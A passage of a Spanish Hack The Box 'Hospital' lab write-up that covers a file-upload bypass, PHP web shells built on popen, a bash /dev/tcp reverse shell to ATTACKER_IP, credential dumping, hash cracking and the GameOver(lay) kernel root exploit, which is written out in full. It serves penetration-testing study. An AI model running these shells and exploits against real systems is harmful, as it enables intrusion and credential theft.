---
tags:
  - Cybersecurity
  - eCPPT
  - Labs
  - HTB
  - Medium
  - AD
  - HTTP
  - FileUploadBypass
  - RCE
  - ReverseShell
  - ExposedConfigurationFile
  - DatabaseEnumeration
  - HashCracking
  - WebMail
  - CommandInjection
---
- [[#Enumeration|Enumeration]]
	- [[#Enumeration#System Enumeration|System Enumeration]]
	- [[#Enumeration#Port Enumeration|Port Enumeration]]
	- [[#Enumeration#Active Directory Enumeration|Active Directory Enumeration]]
	- [[#Enumeration#HTTP|HTTP]]
- [[#Initial Access|Initial Access]]
	- [[#Initial Access#File Upload Bypass|File Upload Bypass]]
	- [[#Initial Access#Remote Command Execution|Remote Command Execution]]
	- [[#Initial Access#Reverse Shell|Reverse Shell]]
- [[#Linux Privilege Escalation (Container)|Linux Privilege Escalation (Container)]]
	- [[#Linux Privilege Escalation (Container)#Exposed Configuration File|Exposed Configuration File]]
	- [[#Linux Privilege Escalation (Container)#Database Enumeration|Database Enumeration]]
	- [[#Linux Privilege Escalation (Container)#Hash Cracking|Hash Cracking]]
	- [[#Linux Privilege Escalation (Container)#GameOver(lay)|GameOver(lay)]]
	- [[#Linux Privilege Escalation (Container)#Hash Cracking|Hash Cracking]]
		- [[#Hash Cracking#SSH Access|SSH Access]]
- [[#Lateral Movement|Lateral Movement]]
	- [[#Lateral Movement#Active Directory Enumeration|Active Directory Enumeration]]
	- [[#Lateral Movement#Hospital WebMail|Hospital WebMail]]
- [[#Windows Privilege Escalation|Windows Privilege Escalation]]
	- [[#Windows Privilege Escalation#GhostScript Command Injection|GhostScript Command Injection]]
	- [[#Windows Privilege Escalation#Writable HTDocs Directory|Writable HTDocs Directory]]
	- [[#Windows Privilege Escalation#Arbitrary File Upload|Arbitrary File Upload]]
	- [[#Windows Privilege Escalation#Reverse Shell|Reverse Shell]]

---
# Hospital

![](Screenshots/Pasted%20image%2020260517175101.png)

> Máquina de Hack The Box llamada **[Hospital](https://app.hackthebox.com/machines/Hospital)**, centrada en la explotación de una aplicación web vulnerable en un entorno híbrido Linux/Active Directory.  
>La intrusión comienza mediante la evasión de restricciones de subida de archivos en un portal médico, logrando ejecución remota de código dentro de un contenedor Linux. Tras obtener acceso inicial, se extraen credenciales sensibles y hashes del sistema, permitiendo crackear contraseñas reutilizadas para acceder por `SSH` como `drwilliams`.  
>Durante la fase de post-explotación, se enumeran servicios internos del dominio y se compromete una instancia vulnerable de `Hospital WebMail`, explotando una vulnerabilidad en `Ghostscript (CVE-2023-36664)` mediante archivos `.eps` maliciosos.
>Finalmente, abusando de permisos inseguros sobre el directorio `xampp\htdocs`, se consigue ejecución arbitraria como `NT AUTHORITY\SYSTEM`, comprometiendo completamente la máquina.



---
## Enumeration
### System Enumeration

```PowerShell
ping -c 1 10.129.229.189
PING 10.129.229.189 (10.129.229.189) 56(84) bytes of data.
64 bytes from 10.129.229.189: icmp_seq=1 ttl=127 time=108 ms

--- 10.129.229.189 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 108.212/108.212/108.212/0.000 ms
```

El `TTL=127` es característico de sistemas Windows (normalmente 128 - 1 salto), lo que nos permite saber el sistema operativo.
### Port Enumeration

```PowerShell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.229.189 -oG allPorts
PORT     STATE SERVICE          REASON
22/tcp   open  ssh              syn-ack ttl 62
53/tcp   open  domain           syn-ack ttl 127
88/tcp   open  kerberos-sec     syn-ack ttl 127
135/tcp  open  msrpc            syn-ack ttl 127
139/tcp  open  netbios-ssn      syn-ack ttl 127
389/tcp  open  ldap             syn-ack ttl 127
443/tcp  open  https            syn-ack ttl 127
445/tcp  open  microsoft-ds     syn-ack ttl 127
464/tcp  open  kpasswd5         syn-ack ttl 127
593/tcp  open  http-rpc-epmap   syn-ack ttl 127
636/tcp  open  ldapssl          syn-ack ttl 127
1801/tcp open  msmq             syn-ack ttl 127
2103/tcp open  zephyr-clt       syn-ack ttl 127
2105/tcp open  eklogin          syn-ack ttl 127
2107/tcp open  msmq-mgmt        syn-ack ttl 127
2179/tcp open  vmrdp            syn-ack ttl 127
3268/tcp open  globalcatLDAP    syn-ack ttl 127
3269/tcp open  globalcatLDAPssl syn-ack ttl 127
3389/tcp open  ms-wbt-server    syn-ack ttl 127
5985/tcp open  wsman            syn-ack ttl 127
6029/tcp open  x11              syn-ack ttl 127
6404/tcp open  boe-filesvr      syn-ack ttl 127
6406/tcp open  boe-processsvr   syn-ack ttl 127
6407/tcp open  boe-resssvr1     syn-ack ttl 127
6409/tcp open  boe-resssvr3     syn-ack ttl 127
6613/tcp open  unknown          syn-ack ttl 127
6630/tcp open  unknown          syn-ack ttl 127
8080/tcp open  http-proxy       syn-ack ttl 62
9389/tcp open  adws             syn-ack ttl 127
```

```PowerShell
nmap -p22,53,88,135,139,389,443,445,464,593,636,1801,2103,2105,2107,2179,3268,3269,3389,5985,6029,6404,6406,6407,6409,6613,6630,8080,9389 -sCV 10.129.229.189 -oN targeted
PORT     STATE SERVICE           VERSION
22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-05-17 22:55:28Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
1801/tcp open  msmq?
2103/tcp open  msrpc             Microsoft Windows RPC
2105/tcp open  msrpc             Microsoft Windows RPC
2107/tcp open  msrpc             Microsoft Windows RPC
2179/tcp open  vmrdp?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2026-05-17T22:56:23+00:00
| ssl-cert: Subject: commonName=DC.hospital.htb
| Not valid before: 2026-05-16T22:49:45
|_Not valid after:  2026-11-15T22:49:45
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6029/tcp open  msrpc             Microsoft Windows RPC
6404/tcp open  msrpc             Microsoft Windows RPC
6406/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6407/tcp open  msrpc             Microsoft Windows RPC
6409/tcp open  msrpc             Microsoft Windows RPC
6613/tcp open  msrpc             Microsoft Windows RPC
6630/tcp open  msrpc             Microsoft Windows RPC
9389/tcp open  mc-nmf            .NET Message Framing
Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-05-17T22:56:27
|_  start_date: N/A
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
```

```PowerShell
crackmapexec smb 10.129.229.189
SMB         10.129.229.189  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
```

Se añade al archivo `/etc/hosts` el dominio: `10.129.229.189 hospital.htb`.

LDAP + Kerberos + SMB → *Domain Controler*
- Dominio: `hospital.htb`
- Host: `DC`
- OS: `Windows 10 / Server 2019 Build 17763 x64`
### Active Directory Enumeration

Se intenta enumerar recursos compartidos.

```PowerShell
crackmapexec smb 10.129.229.189 --shares
SMB         10.129.229.189  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.189  445    DC               [-] Error enumerating shares: [Errno 32] Broken pipe

smbclient -L 10.129.229.189 -N
session setup failed: NT_STATUS_ACCESS_DENIED

rpcclient -U "" 10.129.229.189 -N
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
```

No se consigue nada.
### HTTP

```PowerShell
cat targeted | grep http
443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_  http/1.1
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
6406/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
8080/tcp open  http              Apache httpd 2.4.55 ((Ubuntu))
| http-title: Login
| http-cookie-flags: 
|_      httponly flag not set
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.55 (Ubuntu)
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

De las web, que podemos encontrar nos importan `443` y `8080`.

```HTTP
https://hospital.htb/
```

![](Screenshots/Pasted%20image%2020260517182234.png)

Por ahora, con la web del puerto `443`, no podemos realizar nada.

```HTTP
http://hospital.htb:8080/login.php
```

![](Screenshots/Pasted%20image%2020260517183345.png)

Se encuentra un panel de acceso, además de poder registrarnos. Nos registramos con un nuevo usuario.

![](Screenshots/Pasted%20image%2020260517183537.png)

Se pueden cargar archivos.

---
## Initial Access
### File Upload Bypass

Se crea un archivo llamado `cmd.php`, con el siguiente contenido:

```PHP
<?php
 echo "Hola probando";
?>
```

Se sube, pero solo deja subir imágenes, se intercepta con *Burp Suite*.

![](Screenshots/Pasted%20image%2020260517184454.png)

Al no saber que extensiones me permite ejecutar, se procede a realizar un ataque de fuerza bruta con *Intruder*.

Mediante [File Upload General Methodology - HackTricks](https://hacktricks.wiki/en/pentesting-web/file-upload/index.html?highlight=extensions#file-upload-general-methodology), copiamos todas las extensiones `PHP`.

Se realiza un tratamiento de datos, para poder copiarlo correctamente.

```PowerShell
echo ".php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module" | tr ',' '\n' | sed 's/\.//g' | sed 's/ //' > extensions
```

![](Screenshots/Pasted%20image%2020260517185956.png)

![](Screenshots/Pasted%20image%2020260517190049.png)

![](Screenshots/Pasted%20image%2020260517190131.png)

Se realiza *fuzzing web* para saber donde se suben los archivos.

```PowerShell
gobuster dir -u http://hospital.htb:8080/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 64 
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
uploads              (Status: 301) [Size: 321] [--> http://hospital.htb:8080/uploads/]
css                  (Status: 301) [Size: 317] [--> http://hospital.htb:8080/css/]
js                   (Status: 301) [Size: 316] [--> http://hospital.htb:8080/js/]
images               (Status: 301) [Size: 320] [--> http://hospital.htb:8080/images/]
vendor               (Status: 301) [Size: 320] [--> http://hospital.htb:8080/vendor/]
fonts                (Status: 301) [Size: 319] [--> http://hospital.htb:8080/fonts/]
server-status        (Status: 403) [Size: 279]
Progress: 207641 / 207641 (100.00%)
===============================================================
Finished
===============================================================
```

Se encuentra el directorio `uploads`, además de cambiar el archivo anteriormente creado llamado `cmd.php` a `cmd.pht`.

Se sube el archivo correctamente.

```HTTP
http://hospital.htb:8080/uploads/cmd.pht
```

![](Screenshots/Pasted%20image%2020260517190653.png)

Pero, no lo esta interpretando correctamente.

Se prueba con la extensión: `.phar`.

```HTTP
http://hospital.htb:8080/uploads/cmd.phar
```

![](Screenshots/Pasted%20image%2020260517190826.png)

Lo interpreta correctamente.

Se sube una cmd interactiva.

```PHP
<?php
   echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>"
?>
```

Pero no se consigue ejecutar comandos.

Se prueba a ejecutar `phpinfo()`, para ver que funciones están deshabilitadas.

```PHP
<?php
   phpinfo();
?>
```

![](Screenshots/Pasted%20image%2020260517195623.png)

Para saber que funciones son peligrosos, se utiliza el repositorio: [Dangerous PHP Functions](https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720).

Se crea un pequeño script para comprarlo.

```PHP
<?php
   $dangerous_functions = array("exec", "passthru", "system", "shell_exec", "popen", "proc_open", "pcntl_exec");

   foreach ($dangerous_functions as $f){
      if (function_exists($f)){
         echo "\n [+]" . $f . " - Existe";
      }
   }
?>
```

![](Screenshots/Pasted%20image%2020260517200553.png) 
### Remote Command Execution

Al poder usar `popen`, se procede con la explotación.

```PHP
<?php
   echo fread(popen("whoami", "r"), 10000);
?>
```

```HTTP
http://10.129.229.189:8080/uploads/cmd.phar
```

Se realiza correctamente devolviendo el resultado: `www-data`.

Para poder realizar una cmd interactiva.

```PHP
<?php
   echo fread(popen($_GET['cmd'], "r"), 10000);
?>
```

De esta manera mediante el parámetro `cmd`, podemos realizar ejecución de comandos.

```HTTP
http://10.129.229.189:8080/uploads/cmd.phar?cmd=hostname -I
```

Nos devuelve la IP: `192.168.5.2`. La dirección IP interna y el contexto del sistema sugieren que la aplicación vulnerable se ejecuta dentro de un contenedor Docker aislado del Domain Controller principal.
### Reverse Shell

Máquina atacante:

```PowerShell
nc -nlvp 445
```

Máquina victima:

```PowerShell
http://10.129.229.189:8080/uploads/cmd.phar?cmd=bash -c "bash -i >%26 /dev/tcp/[ATTACKER_IP]/445 0>%261"
```

Se obtiene un consola interactiva con `www-data`.

Se realiza un tratamiento de la terminal.

```PowerShell
script /dev/null -c bash
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
stty rows 59 columns 236
```

Se realiza una búsqueda del sistema.

---
## Linux Privilege Escalation (Container)
### Exposed Configuration File

Se encuentra en la ruta: `/var/www/html` el archivo: `config.php`.

```PHP
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'root');
define('DB_PASSWORD', 'my$qls3rv1c3!');
define('DB_NAME', 'hospital');
 
/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
```

Las credenciales: `root:my$qls3rv1c3!`.
### Database Enumeration

Se accede a *MySQL* para ver la **BBDD**.

```PowerShell
mysql -u root -p
MariaDB [(none)]> show DATABASES;
+--------------------+
| Database           |
+--------------------+
| hospital           |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
MariaDB [(none)]> use hospital;
MariaDB [hospital]> SHOW TABLES;
+--------------------+
| Tables_in_hospital |
+--------------------+
| users              |
+--------------------+
MariaDB [hospital]> SELECT * FROM users;
+----+----------+--------------------------------------------------------------+---------------------+
| id | username | password                                                     | created_at          |
+----+----------+--------------------------------------------------------------+---------------------+
|  1 | admin    | $2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2 | 2023-09-21 14:46:04 |
|  2 | patient  | $2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO | 2023-09-21 15:35:11 |
|  3 | M4nuM0re | $2y$10$6j6m2yEQs2FMmHZVn7xZKeSdRK0B7km9ayK2MkwdGuLXUiz.AiDQW | 2026-05-20 17:51:45 |
+----+----------+--------------------------------------------------------------+---------------------+
```

Se obtiene los hashes de varios usuarios.
### Hash Cracking

```PowerShell
hashid '$2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2'
Analyzing '$2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 
```

```PowerShell
hashcat hashes -m 3200 /usr/share/wordlists/rockyou.txt
$2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2:123456
```

Se obtienen las credenciales `admin:123456`.

Se accede con las credenciales, pero no nos sirve de nada.

Se prueba con búsqueda de permisos *SUID*, *sudo* , *Capabilities* y *permisos de grupo*, pero nada.

Se enumera información del sistema operativo y del kernel.

```PowerShell
uname -a
Linux webserver 5.19.0-35-generic #36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

Se observa la versión `5.19.0-35-generic`. Se realiza una búsqueda y se pueda explotar una vulnerabilidad de *Kernel*.
### GameOver(lay)

[GameOver(lay) Ubuntu Privilege Escalation](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629).

Máquina atacante:

```PowerShell
git clone https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629.git
cd CVE-2023-2640-CVE-2023-32629
cat exploit.sh
#!/bin/bash

# CVE-2023-2640 CVE-2023-3262: GameOver(lay) Ubuntu Privilege Escalation
# by g1vi https://github.com/g1vi
# October 2023

echo "[+] You should be root now"
echo "[+] Type 'exit' to finish and leave the house cleaned"

unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```

Máquina victima:

```PowerShell
cd /tmp
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```

Se obtiene una consola con `root`.

Se busca información del sistema, archivos...

Al ser `root`, podemos visualizar la información del archivo: `/etc/shadow`.

```PowerShell
cat /etc/shadow
root:$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::
daemon:*:19462:0:99999:7:::
bin:*:19462:0:99999:7:::
sys:*:19462:0:99999:7:::
sync:*:19462:0:99999:7:::
games:*:19462:0:99999:7:::
man:*:19462:0:99999:7:::
lp:*:19462:0:99999:7:::
mail:*:19462:0:99999:7:::
news:*:19462:0:99999:7:::
uucp:*:19462:0:99999:7:::
proxy:*:19462:0:99999:7:::
www-data:*:19462:0:99999:7:::
backup:*:19462:0:99999:7:::
list:*:19462:0:99999:7:::
irc:*:19462:0:99999:7:::
_apt:*:19462:0:99999:7:::
nobody:*:19462:0:99999:7:::
systemd-network:!*:19462::::::
systemd-timesync:!*:19462::::::
messagebus:!:19462::::::
systemd-resolve:!*:19462::::::
pollinate:!:19462::::::
sshd:!:19462::::::
syslog:!:19462::::::
uuidd:!:19462::::::
tcpdump:!:19462::::::
tss:!:19462::::::
landscape:!:19462::::::
fwupd-refresh:!:19462::::::
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
lxd:!:19612::::::
mysql:!:19620::::::

#Solo me interesa los hashes de root y drwillians
cat /etc/shadow | grep -E '^root|^drwi'
root:$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
```

Se realiza una búsqueda para saber el tipo de hash que tiene: `drwillians`.

```PowerShell
hashcat --example-hashes | grep '\$6\$'
Name................: sha512crypt $6$, SHA512 (Unix)
  Example.Hash........: $6$72820166$U4DVzpcYxgw7MVVDGGvB2/H5lRistD5.Ah4upwENR5UtffLR4X4SxSzfREv8z6wVl0jRFX40/KnYVvK4829kD1
  Name................: RSA/DSA/EC/OpenSSH Private Keys ($6$)
  Example.Hash........: $sshng$6$8$7620048997557487$1224$13517a1204dc69...172e6 [Truncated, use --mach for full length]
  Example.Hash........: $SNMPv3$6$45889431$3081b702010330110204367c80d4...feaf9 [Truncated, use --mach for full length]

hashcat --example-hashes | grep '\$6\$' -B 15 | less
Hash mode #1800
  Name................: sha512crypt $6$, SHA512 (Unix)
  Category............: Operating System
  Slow.Hash...........: Yes
  Deprecated..........: No
  Deprecated.Notice...: N/A
  Password.Type.......: plain
  Password.Len.Min....: 0
  Password.Len.Max....: 256
  Salt.Type...........: Embedded
  Salt.Len.Min........: 0
  Salt.Len.Max........: 256
  Kernel.Type(s)......: pure, optimized
  Example.Hash.Format.: plain
  Example.Hash........: $6$72820166$U4DVzpcYxgw7MVVDGGvB2/H5lRistD5.Ah4upwENR5UtffLR4X4SxSzfREv8z6wVl0jRFX40/KnYVvK4829kD1
```

De esta manera, sabemos que *hash node* tenemos que utilizar.
### Hash Cracking

```PowerShell
hashcat hash_drwilliams -m 1800 /usr/share/wordlists/rockyou.txt -O
$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:qwe123!@#
```

Credenciales: `drwilliams:qwe123!@#`.

Se prueba a acceder al servicio **SSH** con las credenciales encontradas.
#### SSH Access

```Power
ssh drwilliams@10.129.229.189
```

Se obtiene acceso.

---
## Lateral Movement
### Active Directory Enumeration

```PowerShell
crackmapexec smb 10.129.229.189 -u 'drwilliams' -p 'qwe123!@#'
SMB         10.129.229.189  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.189  445    DC               [+] hospital.htb\drwilliams:qwe123!@#

crackmapexec smb 10.129.229.189 -u 'drwilliams' -p 'qwe123!@#' --shares
SMB         10.129.229.189  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.189  445    DC               [+] hospital.htb\drwilliams:qwe123!@# 
SMB         10.129.229.189  445    DC               [+] Enumerated shares
SMB         10.129.229.189  445    DC               Share           Permissions     Remark
SMB         10.129.229.189  445    DC               -----           -----------     ------
SMB         10.129.229.189  445    DC               ADMIN$                          Remote Admin
SMB         10.129.229.189  445    DC               C$                              Default share
SMB         10.129.229.189  445    DC               IPC$            READ            Remote IPC
SMB         10.129.229.189  445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.229.189  445    DC               SYSVOL          READ            Logon server share

rpcclient -U 'drwilliams%qwe123!@#' 10.129.229.189
rpcclient $> querydominfo
Domain:         HOSPITAL
Server:
Comment:
Total Users:    50
Total Groups:   0
Total Aliases:  15
Sequence No:    1
Force Logoff:   18446744073709551615
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:      0x1

rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[$431000-R1KSAI1DGHMH] rid:[0x464]
user:[SM_0559ce7ac4be4fc6a] rid:[0x465]
user:[SM_bb030ff39b6c4a2db] rid:[0x466]
user:[SM_9326b57ae8ea44309] rid:[0x467]
user:[SM_b1b9e7f83082488ea] rid:[0x468]
user:[SM_e5b6f3aed4da4ac98] rid:[0x469]
user:[SM_75554ef7137f41d68] rid:[0x46a]
user:[SM_6e9de17029164abdb] rid:[0x46b]
user:[SM_5faa2be1160c4ead8] rid:[0x46c]
user:[SM_2fe3f3cbbafa4566a] rid:[0x46d]
user:[drbrown] rid:[0x641]
user:[drwilliams] rid:[0x642]

rpcclient $> querydispinfo
index: 0x2054 RID: 0x464 acb: 0x00020015 Account: $431000-R1KSAI1DGHMH  Name: (null)    Desc: (null)
index: 0xeda RID: 0x1f4 acb: 0x00004210 Account: Administrator  Name: Administrator     Desc: Built-in account for administering the computer/domain
index: 0x2271 RID: 0x641 acb: 0x00000210 Account: drbrown       Name: Chris Brown       Desc: (null)
index: 0x2272 RID: 0x642 acb: 0x00000210 Account: drwilliams    Name: Lucy Williams     Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xf0f RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x2073 RID: 0x465 acb: 0x00020011 Account: SM_0559ce7ac4be4fc6a  Name: Microsoft Exchange Approval Assistant     Desc: (null)
index: 0x207e RID: 0x46d acb: 0x00020011 Account: SM_2fe3f3cbbafa4566a  Name: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}       Desc: (null)
index: 0x207a RID: 0x46c acb: 0x00020011 Account: SM_5faa2be1160c4ead8  Name: Microsoft Exchange        Desc: (null)
index: 0x2079 RID: 0x46b acb: 0x00020011 Account: SM_6e9de17029164abdb  Name: E4E Encryption Store - Active     Desc: (null)
index: 0x2078 RID: 0x46a acb: 0x00020011 Account: SM_75554ef7137f41d68  Name: Microsoft Exchange Federation Mailbox     Desc: (null)
index: 0x2075 RID: 0x467 acb: 0x00020011 Account: SM_9326b57ae8ea44309  Name: Microsoft Exchange        Desc: (null)
index: 0x2076 RID: 0x468 acb: 0x00020011 Account: SM_b1b9e7f83082488ea  Name: Discovery Search Mailbox  Desc: (null)
index: 0x2074 RID: 0x466 acb: 0x00020011 Account: SM_bb030ff39b6c4a2db  Name: Microsoft Exchange        Desc: (null)
index: 0x2077 RID: 0x469 acb: 0x00020011 Account: SM_e5b6f3aed4da4ac98  Name: Microsoft Exchange Migration      Desc: (null)

rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]

rpcclient $> querygroupmem 0x200
        rid:[0x1f4] attr:[0x7]
```

Se enumeran usuarios, grupos y descripciones de usuarios del dominio.

Se procesan los resultados para obtener listas limpias:

```powershell
cat users | awk -F'[][]' '{print $2}' | sponge users
cat groups | awk -F'[][]' '{print $2}' | sponge groups
```

Se prueba a realizar un ataque **AS-REP Roasting**.

```PowerShell
impacket-GetNPUsers hospital.htb/ -usersfile users -no-pass
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
